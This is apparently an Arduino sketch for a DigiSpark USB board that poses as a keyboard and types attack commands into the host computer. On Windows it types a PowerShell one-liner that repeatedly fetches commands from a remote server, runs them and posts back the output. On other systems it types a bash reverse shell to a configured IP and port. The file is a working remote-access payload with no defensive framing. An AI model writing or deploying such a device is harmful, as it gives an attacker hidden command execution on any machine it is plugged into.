/*
Code to be run on DigiSpark compatible boards
*/

#include <avr/wdt.h>
#include "DigiKeyboard.h"

// define server IP and port
#define IP 0.0.0.0
#define PORT 80

static int run;

void blinkLed();
bool win_os();

void setup()
{
  // using watchdogs, the HID emulation can be reset if it hangs
  wdt_enable(WDTO_4S);
  run = 0;

  // pin setup to blink led
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A
}

void loop()
{
  wdt_reset();

  if (win_os())  // running on a Windows machine
  {
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    wdt_reset();
    DigiKeyboard.println("PowerShell $u='"IP":"PORT"';while(1){irm $u -m post -b(iex(irm $u).c)}");
    DigiKeyboard.delay(800);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    wdt_reset();
  }
  else  // running on a Unix machine
  {
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_N, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    wdt_reset();
    DigiKeyboard.println("/bin/bash -i >& /dev/tcp/"IP"/"PORT" 0>&1");
    DigiKeyboard.delay(800);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    wdt_reset();
  }

  DigiKeyboard.update();

  // after the second run (at the third run), the led starts blinking indefinitely
  if (run > 2)
    blinkLed();
  else
    run++;
}

bool win_os()
{
  // TBD - needs to be implemented
  return true;
}

void blinkLed()
{
  while (true) {
    wdt_reset();
    digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
    digitalWrite(1, HIGH);
    delay(250);               // wait for 1/4 of a second
    digitalWrite(0, LOW);    // turn the LED off by making the voltage LOW
    digitalWrite(1, LOW);
    delay(250);
  }
}
